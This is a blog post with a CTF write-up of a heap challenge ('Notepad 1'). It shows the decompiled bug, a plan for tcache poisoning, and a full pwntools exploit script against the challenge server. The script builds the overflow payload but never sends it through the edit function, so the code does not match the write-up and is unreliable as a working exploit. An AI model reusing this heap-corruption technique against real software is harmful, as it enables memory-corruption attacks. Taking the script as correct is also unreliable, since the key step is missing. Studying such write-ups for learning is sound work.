---
title: 1337ctfwriteups
date: 2024-11-19 21:32:57
tags:
---
I played in 1337up CTF last weekend but no one wants to hear about my day so here are my writeups for the few pwn challenges I solved.

# Notepad 1
#### baby heap pwn
## Analysis
We are presented with a few files to host the challenge with a docker instance locally but I'm lazy and there's not much point anyways so I don't use it.

The only really important file is the challenge binary itself, as even though the libc and linker were provided I didn't end up using them

Opening it up in Ghidra, we can see it looks like a pretty simple CRUD heap challenge with a win function.
After looking around a bit, I found the main vulnerability. When creating a note, you are only allowed to write to the allocated chunk the size of the chunk, but when updating it, you are allowed to write up to a set amount of 0x100 bytes.

`createNote`:
```c
  puts("How large you want the note to be?");
  printf("> ");
  __isoc99_scanf(&DAT_001014c3,&size);
  uVar1 = index;
  pvVar2 = malloc(size);
  *(void **)(notepad + (ulong)uVar1 * 8) = pvVar2;
  puts("Add your note:");
  printf("> ");
  local_28 = *(long *)(notepad + (ulong)index * 8);
  sVar3 = read(0,*(void **)(notepad + (ulong)index * 8),size);
```
`editNote`:
```c
  puts("Your changes:");
  printf("> ");
  read(0,*(void **)(notepad + (ulong)index * 8),0x100);
```
This gives us an easy write primitive in subsequent heap chunks, meaning we can do things like overwrite metadata in the following heap chunks. 

# The plan
Armed with a write primitive, we can start planning our exploit. The binary very generously gives us a PIE leak at the start of the program, meaning there is essentially no PIE, so we just need to find a way to call our win function. 

Speaking of, here it is in Ghidra (or at least the important part):
```c
void secretNote(void)

{
  int __fd;
  size_t __n;
  long in_FS_OFFSET;
  undefined local_418 [1032];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  if (key != -0x35014542) {
    puts("You don\'t have access!");
                    /* WARNING: Subroutine does not return */
    exit(-1);
  }
 /* Print flag code */
}
```

That number `-0x35014542` is actually `0xcafebabe` but because its a signed number Ghidra thinks its a negative number.
We can see that to get the flag we must first write 0xcafebabe to the global variable `key` then call secretNote (which there is an option for in the menu).

---
So how can we write to `key`? Recall that we have an overflow in the update function that allows us to overwrite the subsequent chunks of an arbitrary chunk.

This means that we can overwrite the FD and BK pointers of a freed chunk to point to `key`, which will cause the program to think that `key` is a freed chunk in the tcache,  and will return a pointer to `key` after allocating twice.

So, we can allocate two chunks and write 0xcafebabe to the second one, which will be at `key`, then just call the win function.

Before overwrite:
```
0x00: 0x0000000000000000 0x0000000000000020 (chunk1)
0x10: 0x6161616161616161 0x6161616161616161
0x20: 0x6161616161616161 0x0000000000000020 (chunk2)
0x30: 0x(NULL_FD_PTR)
```
After overwrite:
```
0x00: 0x0000000000000000 0x0000000000000020 (chunk1)
0x10: 0x6161616161616161 0x6161616161616161
0x20: 0x6161616161616161 0x0000000000000020 (chunk2)
0x30: 0x(OUR_FD_PTR)
```

```py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./notepad_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe


def conn():
    if args.REMOTE:
        p = remote("notepad.ctf.intigriti.io", 1341)
    else:
        p = process([exe.path])
        if args.DB:
            gdb.attach(p)

    return p


def create(p, i, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', str(i).encode())
    p.sendlineafter(b'> ', str(size).encode())
    p.sendlineafter(b'> ', data)

def read(p, i):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'> ', str(i).encode())
    return p.recvuntil(b'\n\n\nChoose', drop=True)

def update(p, i, data):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'> ', str(i).encode())
    p.sendlineafter(b'> ', data)

def delete(p, i):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'> ', str(i).encode())

def main():
    p = conn()

    # good luck pwning :)
    p.recvuntil(b'gift: ')
    exe_leak = int(p.recvline().strip(), 16)
    exe.address = exe_leak - exe.sym['main']
    print(hex(exe.address))

    create(p, 0, 16, b'deadbeef')  # chunk1
    create(p, 1, 16, b'deadc0de')  # chunk2
    delete(p, 1)                   # Free chunk2 to put it in tcache

    payload = b'a' * 24            # Pad until FD ptr
    payload += flat(0x21, exe.sym['key']) # Overwrite FD

    create(p, 2, 16, b'cafef00d')  # Alloc once to use actual tcache chunk
    create(p, 3, 16, flat(0xcafebabe))  # Alloc once more to use our fake chunk

    p.sendlineafter(b'> ', b'5')

    p.interactive()

if __name__ == "__main__":
    main()
```

This was my first ever pwn writeup and second writeup ever so please give feedback thanks.
